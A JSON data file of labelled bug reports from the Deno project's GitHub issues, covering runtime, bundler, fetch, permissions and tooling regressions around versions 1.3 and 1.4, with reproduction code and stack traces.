[{"labels":["bug",null,null],"text":"This error appears after I switched to Deno 1.4.1 and fixed all the import type errors.\r\n\r\n---\r\n\r\n![image](https://user-images.githubusercontent.com/23035000/93725703-1f229580-fb7f-11ea-858b-ee5d04457f43.png)\r\n\r\n\r\n```ts\r\nSkillz@Home Discordeno % deno run --allow-net --allow-read --unstable debug.ts\r\nerror: Uncaught ReferenceError: RequestMethod is not defined\r\n    return runMethod(RequestMethod.Get, url, body);\r\n                     ^\r\n    at Object.get (requestManager.ts:124:22)\r\n    at createClient (client.ts:44:41)\r\n    at debug.ts:10:1\r\n```\r\n\r\n```ts\r\n  get: async (url: string, body?: unknown) => {\r\n    return runMethod(RequestMethod.Get, url, body);\r\n  },\r\n```\r\n\r\n![image](https://user-images.githubusercontent.com/23035000/93725685-0a460200-fb7f-11ea-8a1a-1bdd9c6d77ec.png)\r\n\r\n![image](https://user-images.githubusercontent.com/23035000/93725689-0d40f280-fb7f-11ea-9785-464b0b9a73f5.png)\r\n\r\nAlso of note VSC shows 0 errors\r\n![image](https://user-images.githubusercontent.com/23035000/93725697-1762f100-fb7f-11ea-9f6f-73bb47393324.png)\r\n\r\n\r\n\r\nAlternative Fix: (to just removing `const`)\r\n![image](https://user-images.githubusercontent.com/23035000/93725706-2649a380-fb7f-11ea-9876-2f698986350d.png)\r\n\r\n\r\nReason(By Kit <3): const enum are not supportable in a --no-check situation, and so in Deno 1.4.0+ we switched on the isolatedModules flag with --unstable to help folks ensure their code was \"no check\" safe. \r\n\r\nCan we get a better error message for this please. Confused me like crazy! Although im always confused so... hahaha"},{"labels":["bug",null],"text":"### \r\n\r\nTake the following code as an example:\r\n\r\n```js\r\nconst handle = setTimeout(() => {\r\n  console.log(\"timeout finish\");\r\n}, 10000);\r\nclearTimeout(handle);\r\nconsole.log(\"finish\");\r\n```\r\n\r\nWe expect that this program finishes _immediately_ after `console.log(\"finish\");`, because the timeout has been canceled. But actually when running it by `deno run`, we need to wait 10 seconds until the program finishes.\r\n(In Node.js, the program behaves as we expect.)\r\n\r\nThis unexpected behavior in Deno is likely because `opStartGlobalTimer` is an async operation, which means that turning event loop is required to let `GlobalTimer` in Rust start working. \r\nhttps://github.com/denoland/deno/blob/0a9d7e4e397a688dbd5d9448cdcbb119182ed446/cli/rt/11_timers.js#L11-L13\r\n\r\nI guess `GlobalTimer` should start counting time synchronously, but callback needs to be executed asynchronously - we may have to do a big change to achieve this?\r\nI've just started referring to the implementation of Node.js, but I don't get any solution so far.\r\n\r\nThis issue also has something to do with the FIXME comment below:\r\nhttps://github.com/denoland/deno/blob/0a9d7e4e397a688dbd5d9448cdcbb119182ed446/cli/rt/11_timers.js#L309-L316\r\n\r\n"},{"labels":["bug",null],"text":"I'm running my script with `deno run --watch --unstable myscript.ts`. When it encounters a call to `Deno.exit`, the script terminates, including the file watcher.\r\n\r\nI expected `Deno.exit` to terminate the script, but keep the file watcher alive. This is how Node's `process.exit` behaves when used with nodemon.\r\n\r\nIt seems culprit is [the current implementation, which is just a passthrough to `std::process::exit`](https://github.com/denoland/deno/blob/104aebdfb5d01f7482bacef6d58c2ce16da44334/cli/ops/os.rs#L117). I'm still familiarizing myself with Deno and V8, but is the solution something like tearing down the active runtime without exiting the main process?"},{"labels":["bug",null],"text":"The unstable Deno Permissions APIs `request()` method currently appears unable to grant url \"scoped\" permissions for the `net` `PermissionDescriptor` whose interface allows for providing an allowlist for urls.\r\n\r\nPlease see below for code to reproduce:\r\n\r\n```ts\r\nconsole.log(await Deno.permissions.query({ name: \"net\", url: \"http://google.com\" }));\r\nconsole.log(await Deno.permissions.revoke({ name: \"net\" }));\r\nconsole.log(await Deno.permissions.request({ name: \"net\", url: \"http://google.com\" }));\r\nconsole.log(await Deno.permissions.query({ name: \"net\", url: \"http://google.com\" }));\r\nconsole.log(await fetch(\"http://google.com\"));\r\n```\r\n\r\nWhen executed with the following command:\r\n\r\n```console\r\n$ deno run --unstable --allow-net=google.com ./example.ts\r\n\r\nPermissionStatus { state: \"granted\" }\r\nPermissionStatus { state: \"prompt\" }\r\n️⚠️  Deno requests network access to \"http://google.com\". Grant? [g/d (g = grant, d = deny)] g\r\nPermissionStatus { state: \"granted\" }\r\nPermissionStatus { state: \"prompt\" }\r\nerror: Uncaught PermissionDenied: network access to \"http://google.com/\", run again with the --allow-net flag\r\n    at Object.jsonOpAsync (core.js:236:13)\r\n    at async fetch (deno:op_crates/fetch/26_fetch.js:1272:29)\r\n    at async example.ts:13:13\r\n```\r\n\r\nThe expected behaviour is that following the permission request the following query should return a `PermissionStatus` with `state: \"granted\"` and the `fetch()` should be permitted.\r\n\r\nInstead we are seeing the permission is not granted, despite the `granted` state response from the request call and the `fetch()` throws a `PermissionDenied` error."},{"labels":["bug",null],"text":"Hi,\r\n\r\nI just found out that `deno install` is not working properly if the version of a module has not been specified. Without a version tag only one file is downloaded and therefore the installed program does not work due to missing depedencies.\r\nI think it has something to do with the redirect happening but it's just an idea.\r\n\r\n**How to reproduce?**\r\nThis does not work properly:\r\n`deno install --allow-net -f -n sherlock https://deno.land/x/sherlock/cli.ts`\r\nThis does:\r\n`deno install --allow-net -f -n sherlock https://deno.land/x/sherlock@v1.6.0/cli.ts`\r\n\r\nI think the first command should have the same results as manually setting the version to let users always install the newest version automatically."},{"labels":["bug",null],"text":"**Error**\r\n![image](https://user-images.githubusercontent.com/34997667/93345909-0188bf80-f851-11ea-89dd-465e86890994.png)\r\n\r\n**Steps to reproduce**\r\n\r\n```typescript\r\nconst code: string = `\r\n// foo.ts\r\nexport * from \"./a.ts\";\r\nexport * from \"./b.ts\";\r\n`\r\nawait Deno.bundle(\r\n        \"/foo.ts\",\r\n        {\r\n          \"/foo.ts\": code,\r\n        },\r\n        {\r\n          target: \"es3\",\r\n          module: \"esnext\",\r\n        },\r\n  );\r\n```\r\nwhere `a.ts` and `b.ts` can be any valid typescript module\r\n\r\n**Deno** - 1.4.0\r\n**v8** -  8.7.75\r\n**typescript** - 4.0.2\r\n"},{"labels":["bug",null],"text":"```\r\n~ ❯❯❯ deno info https://deno.land/std@0.69.0/http/server.ts | head\r\nlocal: /home/lucacasonato/.cache/deno/deps/https/deno.land/46b808b8747ed75c4be741a37f6b10130ff7de51f37b58ee9b920d0a76aa6cf9\r\ntype: TypeScript\r\ncompiled: /home/lucacasonato/.cache/deno/gen/https/deno.land/46b808b8747ed75c4be741a37f6b10130ff7de51f37b58ee9b920d0a76aa6cf9.js\r\ndeps: 12 unique (total 63.31KB)\r\nhttps://deno.land/std@0.69.0/http/server.ts (10.23KB)\r\n├── https://deno.land/std@0.69.0/encoding/utf8.ts (433B)\r\n├─┬ https://deno.land/std@0.69.0/io/bufio.ts (21.15KB)\r\n│ ├── https://deno.land/std@0.69.0/bytes/mod.ts (4.34KB)\r\n│ └── https://deno.land/std@0.69.0/_util/assert.ts (405B)\r\n├── https://deno.land/std@0.69.0/_util/assert.ts *\r\nthread 'main' panicked at 'failed printing to stdout: Broken pipe (os error 32)', src/libstd/io/stdio.rs:955:9\r\nstack backtrace:\r\n   0: backtrace::backtrace::libunwind::trace\r\n             at /cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.46/src/backtrace/libunwind.rs:86\r\n   1: backtrace::backtrace::trace_unsynchronized\r\n             at /cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.46/src/backtrace/mod.rs:66\r\n   2: std::sys_common::backtrace::_print_fmt\r\n             at src/libstd/sys_common/backtrace.rs:78\r\n   3: <std::sys_common::backtrace::_print::DisplayBacktrace as core::fmt::Display>::fmt\r\n             at src/libstd/sys_common/backtrace.rs:59\r\n   4: core::fmt::write\r\n             at src/libcore/fmt/mod.rs:1076\r\n   5: std::io::Write::write_fmt\r\n             at src/libstd/io/mod.rs:1537\r\n   6: std::sys_common::backtrace::_print\r\n             at src/libstd/sys_common/backtrace.rs:62\r\n   7: std::sys_common::backtrace::print\r\n             at src/libstd/sys_common/backtrace.rs:49\r\n   8: std::panicking::default_hook::{{closure}}\r\n             at src/libstd/panicking.rs:198\r\n   9: std::panicking::default_hook\r\n             at src/libstd/panicking.rs:217\r\n  10: std::panicking::rust_panic_with_hook\r\n             at src/libstd/panicking.rs:526\r\n  11: rust_begin_unwind\r\n             at src/libstd/panicking.rs:437\r\n  12: std::panicking::begin_panic_fmt\r\n             at src/libstd/panicking.rs:391\r\n  13: std::io::stdio::print_to\r\n             at src/libstd/io/stdio.rs:955\r\n  14: std::io::stdio::_print\r\n             at src/libstd/io/stdio.rs:967\r\n  15: <core::future::from_generator::GenFuture<T> as core::future::future::Future>::poll\r\n  16: tokio::runtime::Runtime::block_on\r\n  17: deno::main\r\n  18: std::rt::lang_start_internal::{{closure}}::{{closure}}\r\n             at src/libstd/rt.rs:52\r\nnote: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.\r\n```\r\n\r\nRef #3872\r\n\r\nFor how to fix see #3910"},{"labels":["bug",null],"text":"The quiet option is not honoured:\r\n\r\n```\r\n$ deno --version\r\ndeno 1.3.3\r\nv8 8.6.334\r\ntypescript 4.0.2\r\n\r\n$ deno fmt --quiet Drakefile.ts \r\n\r\n$\r\n```\r\n\r\n```\r\n$ deno --version\r\ndeno 1.4.0\r\nv8 8.7.75\r\ntypescript 4.0.2\r\n\r\n$ deno fmt --quiet Drakefile.ts \r\nChecked 1 file\r\n\r\n$\r\n```\r\n\r\nThe `Checked N file` message appears to be new (`fmt` was quiet by default in Deno 1.3.3)."},{"labels":["bug",null,null],"text":"There appears to be a (repeated) typo in naming the smallest time unit, millisecond, i.e.:\r\n\r\nhttps://github.com/denoland/deno/blob/b3fa81f867f933df41f274bd8eec10dddf1b1b28/std/datetime/mod.ts#L136"},{"labels":["bug",null],"text":"```\r\nimport { delay } from \"https://deno.land/std@0.65.0/async/delay.ts\";\r\n\r\nconst ws = new WebSocket(\"wss://irc-ws.chat.twitch.tv:443\");\r\n\r\nws.onopen = () => console.log(\"connection opened\");\r\n\r\nws.onclose = () => console.log(\"conn closed\");\r\n\r\nawait delay(5000);\r\n\r\nws.close();\r\n```\r\n\r\nIssue is when closing a WS connection something appears to be stuck in the event loop (just a guess), preventing the program from terminating. To replicate this issue, just create a ws connection and close it.\r\n"},{"labels":["bug"],"text":"Hi, I just upgraded to the latest version and am having some problems installing libraries.\r\n\r\nI'm working on this static site generator: https://deno.land/x/lume@v0.2.2\r\n\r\nI've a downgrade to `1.3.3` and the library is installed and work fine:\r\n\r\n```sh\r\n$ deno upgrade --version 1.3.3\r\n$ deno install -f --unstable --allow-read --allow-write --allow-net https://deno.land/x/lume@v0.2.2/cli.js\r\n$ lume\r\n\r\n#Site build successfully\r\n```\r\n\r\nBut after upgrade to `1.4.0`:\r\n\r\n```sh\r\n$ deno upgrade --version 1.4.0\r\n$ deno install -f --unstable --allow-read --allow-write --allow-net https://deno.land/x/lume@v0.2.2/cli.js\r\n$ lume\r\n\r\nerror: Uncaught TypeError: Cannot read property 'default' of undefined\r\nexport default __exp[\"default\"];\r\n                    ^\r\n    at file:///Users/oscarotero/.deno/bin/lume.js:47172:21\r\n```\r\n\r\nThe library works fine if it's executed locally, without install it (with `deno run --unstable --allow-read --allow-write --allow-net cli.js`), but it's failing on install. And because in the new version, the code is bundled before installation, I cannot know what is the source's filename and line that is failing."},{"labels":["bug"],"text":"```js\r\nconsole.log(\"start\");\r\n\r\n// Just here to block execution\r\nsetInterval(() => {}, 100);\r\n\r\nwindow.addEventListener(\"unload\", () => {\r\n  console.log(\"unload\");\r\n});\r\n```\r\n\r\nShould print\r\n```\r\nCheck file:///mnt/f9/Projects/github.com/denoland/deno/test.ts\r\nstart\r\nunload\r\nWatcher File change detected! Restarting!\r\nCheck file:///mnt/f9/Projects/github.com/denoland/deno/test.ts\r\nstart\r\n```\r\nbut it prints\r\n```\r\nCheck file:///mnt/f9/Projects/github.com/denoland/deno/test.ts\r\nstart\r\nWatcher File change detected! Restarting!\r\nCheck file:///mnt/f9/Projects/github.com/denoland/deno/test.ts\r\nstart\r\n```"},{"labels":["bug"],"text":"Paths returned from Deno.compile when an outDir is given have changed in 1.3.3\r\n \r\n```typescript\r\nimport { ensureDir } from \"https://deno.land/std/fs/mod.ts\";\r\n\r\nawait ensureDir(\"lib\");\r\n\r\nconst [diagnostics, records] = await Deno.compile(\r\n  \"src/wasi_snapshot_preview1.ts\",\r\n  undefined,\r\n  {\r\n    outDir: \"./lib\",\r\n  },\r\n);\r\n\r\nif (diagnostics) {\r\n  for (const diagnostic of diagnostics) {\r\n    console.error(diagnostic);\r\n  }\r\n\r\n  Deno.exit(1);\r\n}\r\n\r\nfor (const [filepath, source] of Object.entries(records)) {\r\n  console.error(filepath, source.length);\r\n}\r\n```\r\n\r\n1.3.2 output (**expected**):\r\n\r\n```\r\ndeno run --allow-all --unstable build.ts\r\nCheck file:///Users/caspervonb/web-wasi/build.ts\r\nlib/wasi_snapshot_preview1.js.map 13592\r\nlib/wasi_snapshot_preview1.js 13961\r\n```\r\n\r\n1.3.3 output (**regression**):\r\n\r\n```\r\n$ deno run --allow-all --unstable build.ts\r\nCheck file:///Users/caspervonb/web-wasi/build.ts\r\n/lib/wasi_snapshot_preview1.js.map 13592\r\n/lib/wasi_snapshot_preview1.js 13961\r\n```"},{"labels":["bug",null],"text":"When the URL given to `@deno-types` returns an HTTP redirect, Deno seems to ignore the response rather than following it. I believe this is a regression, but I haven't bisected which version.\r\n\r\n```sh\r\n$ deno --version\r\ndeno 1.3.3\r\nv8 8.6.334\r\ntypescript 4.0.2\r\n```"},{"labels":["bug",null],"text":"```ts\r\nconst proc = Deno.run({cmd: ['echo', 'hi']})\r\n\r\nawait proc.status()\r\n\r\nproc.kill(Deno.Signal.SIGQUIT)\r\n```\r\noutput:\r\n```bash\r\n ✘ andrew  ~  deno run --allow-run --unstable simple.ts\r\nCheck file:///home/andrew/simple.ts\r\nhi\r\nthread 'main' panicked at 'internal error: entered unreachable code', cli/errors.rs:164:27\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\r\nfatal runtime error: failed to initiate panic, error 5\r\n[1]    137739 abort (core dumped)  deno run --allow-run --unstable simple.ts\r\n```\r\n\r\nThis seems like an error that is not supposed to be exposed to users of deno. On top of that, I dont actually know how I am supposed to check if a process is still alive before sending it a signal. I think ideally Process.kill should throw a catchable error if the process is no longer running."},{"labels":["bug"],"text":"```console\r\n$ deno --version\r\ndeno 1.3.3\r\nv8 8.6.334\r\ntypescript 4.0.2\r\n\r\n$ deno doc foobar\r\n\r\nthread 'main' has overflowed its stack\r\nfatal runtime error: stack overflow\r\nfish: “deno doc foobar” terminated by signal SIGABRT (Abort)\r\n```\r\n\r\ngdb backtrace:\r\n\r\n```console\r\n$ gdb --args deno doc foobar\r\nGNU gdb (GDB) 9.2\r\nCopyright (C) 2020 Free Software Foundation, Inc.\r\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\r\nThis is free software: you are free to change and redistribute it.\r\nThere is NO WARRANTY, to the extent permitted by law.\r\nType \"show copying\" and \"show warranty\" for details.\r\nThis GDB was configured as \"x86_64-unknown-linux-gnu\".\r\nType \"show configuration\" for configuration details.\r\nFor bug reporting instructions, please see:\r\n<http://www.gnu.org/software/gdb/bugs/>.\r\nFind the GDB manual and other documentation resources online at:\r\n    <http://www.gnu.org/software/gdb/documentation/>.\r\n\r\nFor help, type \"help\".\r\nType \"apropos word\" to search for commands related to \"word\"...\r\nReading symbols from deno...\r\n(gdb) r\r\nStarting program: /home/scott/.deno/bin/deno doc foobar\r\n[Thread debugging using libthread_db enabled]\r\nUsing host libthread_db library \"/nix/store/7p1v1b6ys9fydg5kdqvr5mpr8svhwf4p-glibc-2.31/lib/libthread_db.so.1\".\r\n\r\nProgram received signal SIGSEGV, Segmentation fault.\r\n0x0000555555adb5d7 in alloc::vec::Vec<T>::reserve ()\r\n(gdb) bt\r\n#0  0x0000555555adb5d7 in alloc::vec::Vec<T>::reserve ()\r\n#1  0x0000555555adb5aa in <alloc::vec::Vec<T> as alloc::vec::SpecExtend<&T,core::slice::Iter<T>>>::spec_extend ()\r\n#2  0x0000555555adf00c in <&mut W as core::fmt::Write>::write_str ()\r\n#3  0x00005555558c5c83 in core::fmt::write () at src/libcore/fmt/mod.rs:1075\r\n#4  0x0000555555adeffa in core::fmt::Write::write_fmt ()\r\n#5  0x00005555558edf61 in <deno_doc::parser::DocError as core::fmt::Display>::fmt ()\r\n#6  0x00005555558c5cac in core::fmt::write () at src/libcore/fmt/mod.rs:1076\r\n#7  0x0000555555adeffa in core::fmt::Write::write_fmt ()\r\n[... thousands of identical repetitions ...]\r\n#74339 0x00005555558edf61 in <deno_doc::parser::DocError as core::fmt::Display>::fmt ()\r\n#74340 0x00005555558c5cac in core::fmt::write () at src/libcore/fmt/mod.rs:1076\r\n#74341 0x0000555555adeffa in core::fmt::Write::write_fmt ()\r\n#74342 0x00005555558edf61 in <deno_doc::parser::DocError as core::fmt::Display>::fmt ()\r\n#74343 0x00005555558c5cac in core::fmt::write () at src/libcore/fmt/mod.rs:1076\r\n#74344 0x0000555555bedfdf in std::io::Write::write_fmt () at src/libstd/io/mod.rs:1537\r\n#74345 <std::io::stdio::Stderr as std::io::Write>::write_fmt () at src/libstd/io/stdio.rs:842\r\n#74346 0x0000555555beea8a in std::io::stdio::print_to::{{closure}} () at src/libstd/io/stdio.rs:950\r\n#74347 std::thread::local::LocalKey<T>::try_with () at src/libstd/thread/local.rs:263\r\n#74348 std::io::stdio::print_to () at src/libstd/io/stdio.rs:939\r\n#74349 std::io::stdio::_eprint () at src/libstd/io/stdio.rs:978\r\n#74350 0x000055555586eaed in deno::doc_command::{{closure}} ()\r\n#74351 0x00005555557b4776 in <core::future::from_generator::GenFuture<T> as core::future::future::Future>::poll ()\r\n#74352 0x0000555555757b4c in tokio::runtime::Runtime::block_on ()\r\n#74353 0x0000555555871a7c in deno::main ()\r\n#74354 0x0000555555bfb1b3 in std::rt::lang_start_internal::{{closure}}::{{closure}} () at src/libstd/rt.rs:52\r\n#74355 std::sys_common::backtrace::__rust_begin_short_backtrace () at src/libstd/sys_common/backtrace.rs:130\r\n#74356 0x000055555587862f in main ()\r\n```"},{"labels":["bug",null,null],"text":"Minor but seems that crate::colors use the bright variants where-as our rt utils use the regular colors.\r\n\r\n![Screenshot 2020-09-04 at 12 58 01 PM](https://user-images.githubusercontent.com/157787/92292323-32165280-ef4f-11ea-8bdd-3a6c33a0cbe6.png)\r\n"},{"labels":["bug",null],"text":"\r\nWhen using fetch with a URL that does not return any body (i.e a delete route of an API) the following error is returned: \r\n\r\n```\r\nCheck file:///[...]/project/demo/empty_body.js\r\nProvided input is not of type ArrayBuffer or ArrayBufferView\r\nTypeError: Provided input is not of type ArrayBuffer or ArrayBufferView\r\n    at TextDecoder.decode (/Users/runner/work/deno/deno/op_crates/web/08_text_encoding.js:456:15)\r\n    at Response.text (rt/24_body.js:200:22)\r\n    at async HttpRequests.request (http-requests.ts:50:34)\r\n    at async HttpRequests.delete (http-requests.ts:163:12)\r\n    at async Index.deleteIndex (index.ts:168:12)\r\n    at async file:///[...]/project/demo/empty_body.js:14:1\r\n```\r\n\r\nApparently the return body should be of either type `ArrayBuffer` or `ArrayBufferView`.\r\nThis error did not exists in previous versions.\r\nI think it has to do with #7178\r\n\r\nIt does not expect the body to be `null` in `08_text_encoding.js:456:15`.\r\n\r\n```javascript\r\n decode(\r\n      input,\r\n      options = { stream: false },\r\n    ) {\r\n      if (options.stream) {\r\n        throw new TypeError(\"Stream not supported.\");\r\n      }\r\n\r\n      let bytes;\r\n      if (input instanceof Uint8Array) {\r\n        bytes = input;\r\n      } else if (isEitherArrayBuffer(input)) {\r\n        bytes = new Uint8Array(input);\r\n      } else if (\r\n        typeof input === \"object\" &&\r\n        input !== null &&\r\n        \"buffer\" in input &&\r\n        isEitherArrayBuffer(input.buffer)\r\n      ) {\r\n        bytes = new Uint8Array(\r\n          input.buffer,\r\n          input.byteOffset,\r\n          input.byteLength,\r\n        );\r\n      } else {\r\n        throw new TypeError(\r\n          \"Provided input is not of type ArrayBuffer or ArrayBufferView\",\r\n        );\r\n      }\r\n```\r\n\r\nSo my question is: \r\nIs this a problem with fetch, a problem with this function or a bad practice to not return a body?"},{"labels":["bug",null],"text":"deno:\r\n```js\r\nnew URLSearchParams('q=a+b').get('q') // => \"a+b\"\r\nnew URLSearchParams('q=a+b').toString() // => \"q=a%2Bb\"\r\n```\r\n\r\nnode, browsers (safari, chrome, firefox):\r\n```js\r\nnew URLSearchParams('q=a+b').get('q') // => \"a b\"\r\nnew URLSearchParams('q=a+b').toString() // => \"q=a+b\"\r\n```"},{"labels":["bug",null],"text":"## Reproduction\r\nmain.js:\r\n```\r\nimport * as path from \"https://deno.land/std@0.67.0/path/mod.ts\";\r\nconst { a, ...rest } = { a: 3, b: \"bar\" };\r\nconsole.log(a, rest);\r\n```\r\nCLI:\r\n```\r\ndeno bundle main.js build/main.js\r\ndeno run build/main.js\r\n```\r\nresults in:\r\n\r\n> error: Uncaught ReferenceError: __rest is not defined\r\n            _a = { a: 3, b: \"bar\" }, a = _a.a, rest = __rest(_a, [\"a\"]);\r\n                                       ^\r\n    at execute (file:///tmp/TestProj/build/main.js:389:40)\r\n    at gExp (file:///tmp/TestProj/build/main.js:90:7)\r\n    at __instantiate (file:///tmp/TestProj/build/main.js:97:27)\r\n    at file:///tmp/TestProj/build/main.js:395:1\r\n\r\nbuild/main.js emits:\r\n```\r\nSystem.register(\"file:///tmp/TestProj/main\", [], function (exports_11, context_11) {\r\n    // ...\r\n    return {\r\n        // ...\r\n        execute: function () {\r\n            _a = { a: 3, b: \"bar\" }, a = _a.a, rest = __rest(_a, [\"a\"]); // this is the error cause\r\n            // ...\r\n        }\r\n    };\r\n});\r\n```\r\nThe `__rest` method is not defined anywhere in the emitted build output.\r\n\r\nIf I comment out the `import` statement on first line, it works again. `deno bundle` seems to change its build output conditionally dependent on whether the file is a script or a module - doesn't matter what exactly is imported.\r\n\r\nIs this a `deno bundle` error or could it be more related to underlying TS SystemJS bundling?\r\n\r\n\r\n"},{"labels":["bug",null],"text":"Since upgrading to Deno 1.3.2 I have seen an overflow error running `deno lint --unstable`\r\n\r\n```\r\nthread 'tokio-runtime-worker' has overflowed its stack\r\nfatal runtime error: stack overflow\r\n/home/runner/work/_temp/998ca1c5-1210-471d-bd26-b595fc5f0f07.sh: line 1:  4053 Aborted                 (core dumped) deno lint --unstable\r\n##[error]Process completed with exit code 134.\r\n```\r\nYou can see the error here - \r\nhttps://github.com/use-seedling/seedling/runs/1048772375?check_suite_focus=true\r\n\r\nTo reproduce, download master of https://github.com/use-seedling/seedling/\r\nRun `deno upgrade --version 1.3.2`\r\nRun `deno lint --unstable` \r\n\r\nYou can see the issue. No error file is output, so I have nothing else to give to show the issue.\r\nThe repository did have a lot of warnings for `ban-types`. I have either fixed or added `//deno-lint-ignore ban-types`."},{"labels":["bug",null,null],"text":"I'm running into some strange issues when fetching image files. Pulled my hair out trying to catch the problematic portion...turns out the problematic portion is simply `fetch()` itself =), and there is no catching or working around the issue, it simply crashes each time it encounters whatever the problem is. I reduced what I'm doing to a (hopefully) reproducible snippet:\r\n\r\n```js\r\nDeno.env.set('RUST_BACKTRACE', 'full'); // needs --allow-env\r\n\r\n// content-disposition: inline; filename=\"2020-04-27_15h06_25.png\"; filename*=UTF-8''2020-04-27_15h06_25.png\r\nconst working = 'https://community.upc.ch/t5/image/serverpage/image-id/7683i8DD8EAF256FF500C';\r\n// content-disposition: inline; filename=\"Ursprnge-und-Rezepte-Blog-Banner.png\"; filename*=UTF-8''Urspr%C3%BCnge-und-Rezepte-Blog-Banner.png\r\nconst panic1 = 'https://community.upc.ch/t5/image/serverpage/image-id/7679iD6978D01CC52670D';\r\n// content-disposition: inline; filename=\"virtuelle-Untersttzung_blog.jpg\"; filename*=UTF-8''virtuelle-Unterst%C3%BCtzung_blog.jpg\r\nconst panic2 = 'https://community.upc.ch/t5/image/serverpage/image-id/7611i6132FD57C7312C6D';\r\n// content-disposition: inline; filename=\"virtuelle-Untersttzung_blog.jpg\"; filename*=UTF-8''virtuelle-Unterst%C3%BCtzung_blog.jpg\r\nconst panic3 = 'https://community.upc.ch/t5/image/serverpage/image-id/7610i2A587382D4015838';\r\n// content-disposition: inline; filename=\"Ursprnge-und-Rezepte-Blog-Banner.png\"; filename*=UTF-8''Urspr%C3%BCnge-und-Rezepte-Blog-Banner.png\r\nconst panic4 = 'https://community.upc.ch/t5/image/serverpage/image-id/7680i0E08F8FBC53FFB86';\r\n// content-disposition: inline; filename=\"Lg EPG - Update - UPC Community.jpg\"; filename*=UTF-8''L%C3%B6sung%20EPG%20-%20Update%20-%20UPC%20Community.jpg\r\nconst panic5 = 'https://community.upc.ch/t5/image/serverpage/image-id/6214i47B0827B20634C66';\r\n// content-disposition: inline; filename=\"Programmbersicht vom 19.1.2019 - TV-Programm von UPC.jpg\"; filename*=UTF-8''Programm%C3%BCbersicht%20vom%2019.1.2019%20-%20TV-Programm%20von%20UPC.jpg\r\nconst panic6 = 'https://community.upc.ch/t5/image/serverpage/image-id/5030i891681AB69CE5C39';\r\n// content-disposition: inline; filename=\"Programmbersicht vom 19.1.2019 - TV-Programm von SRF.jpg\"; filename*=UTF-8''Programm%C3%BCbersicht%20vom%2019.1.2019%20-%20TV-Programm%20von%20SRF.jpg\r\nconst panic7 = 'https://community.upc.ch/t5/image/serverpage/image-id/5030i891681AB69CE5C39';\r\n// content-disposition: inline; filename=\"Ststes Mobilnetz   UPC.jpg\"; filename*=UTF-8''St%C3%A4rkstes%20Mobilnetz%20%20%20UPC.jpg\r\nconst panic8 = 'https://community.upc.ch/t5/image/serverpage/image-id/4954i1B3CE88242518135';\r\n// content-disposition: inline; filename=\"l.JPG\"; filename*=UTF-8''l%C3%B6ser.JPG\r\nconst panic9 = 'https://community.upc.ch/t5/image/serverpage/image-id/3571i5F26CFABF7C4A92D';\r\n// content-disposition: inline; filename=\"leere Beitr.JPG\"; filename*=UTF-8''leere%20Beitr%C3%A4ge.JPG\r\nconst panic10 = 'https://community.upc.ch/t5/image/serverpage/image-id/3449i22A920E6B52DE26C';\r\n// content-disposition: inline; filename=\"Krmel.JPG\"; filename*=UTF-8''Kr%C3%BCmel.JPG\r\nconst panic11 = 'https://community.upc.ch/t5/image/serverpage/image-id/3321i50B36E3AE3CA5BEC';\r\n// content-disposition: inline; filename=\"ein kleiner Lacher fr zwischendurch ;).jpg\"; filename*=UTF-8''ein%20kleiner%20Lacher%20f%C3%BCr%20zwischendurch%20%3B%29.jpg\r\nconst panic12 = 'https://community.upc.ch/t5/image/serverpage/image-id/3128iB4861C5D5DB8626F';\r\n\r\n// let res = await fetch(working);\r\nlet res = await fetch(panic1);\r\n// let res = await fetch(panic2, {\r\n//\tmethod: 'HEAD' // doesn't change anything, e.g. definitely a header issue IMHO\r\n//});\r\nres = await res.blob();\r\n\r\nconsole.log(res);\r\n```\r\n\r\nthe error I'm getting is:\r\n\r\n`thread 'main' panicked at 'called Result::unwrap() on an Err value: ToStrError { _priv: () }', cli/ops/fetch.rs:96:42`\r\n\r\nI thought at first it might be some strange thing with one specific image/file, but then I skipped that one and soon thereafter ran into the same crash again, so it isn't only one specific file, I think it is more something within the headers of the response that fails not with the actual file-data, because the rust stack trace points to this:\r\n\r\n```rust\r\n    for (key, val) in res.headers().iter() {\r\n      // no idea why there is .to_string() for key and .to_str() for value =)...is there a difference?\r\n      // forgive the comment, not familiar with the rust side of deno yet\r\n      res_headers.push((key.to_string(), val.to_str().unwrap().to_owned()));\r\n    }\r\n```\r\n\r\nfrom here https://github.com/denoland/deno/blob/6d964fc607f78b1652a4e04e8a7cf3672fac9d61/cli/ops/fetch.rs#L97\r\n\r\nI'm assuming it is specifically this part: `val.to_str().unwrap().to_owned()` as it calls `.unwrap()` which is mentioned in the stack trace...\r\n\r\nI had a closer look at the headers (via browser inspector > network tab) and the only potentially problematic thing I'm seeing for ALL \"panic\" files is the `content-disposition` header that they contain the actual filename the image was uploaded as and when they have (seemingly?) encoded German umlauts in their names, things break. As far as I can take from MDN:\r\n> The parameters filename and filename* differ only in that filename* uses the encoding defined in RFC 5987. When both filename and filename* are present in a single header field value, filename* is preferred over filename when both are understood.\r\n\r\nso technically that would mean the `filename*` one is taken, which seems properly encoded? But yeah, just guessing here, the pattern seems quite constant though...\r\n\r\nMight be somehow related to those #6649 #6965\r\n\r\nPS: Just upgraded to Deno 1.3.1, same issue, but had the same on the version before that, don't remember what it was, but for sure 1.x!"},{"labels":["bug",null],"text":"I’m currently experimenting with different syntaxes for portable asset references for a bundler I’m writing. If I use the following syntax:\r\n\r\n```tsx\r\n/** @jsx createElement */\r\n/// <asset path=\"./styles.css\" />\r\n```\r\n\r\nDeno bundling and compilation will throw the error:\r\n\r\n```\r\nerror: Uncaught TypeError: Cannot resolve extension for \"file:///my/project/styles.css\" with mediaType \"Unknown\".\r\n    at getExtension (tsc/99_main_compiler.js:470:15)\r\n    at new SourceFile (tsc/99_main_compiler.js:523:24)\r\n    at Function.addToCache (tsc/99_main_compiler.js:530:18)\r\n    at buildSourceFileCache (tsc/99_main_compiler.js:886:18)\r\n    at bundle (tsc/99_main_compiler.js:1562:5)\r\n    at tsCompilerOnMessage (tsc/99_main_compiler.js:1803:24)\r\n    at <compiler>:1:12\r\n```\r\nMy expectation is that deno would check the tag of the XML element before following the path attribute. Typescript itself doesn’t seem to have a problem with this syntax. Naming the attribute something other than `path` works, but I wonder if this is just an oversight in `pre_process_file`: 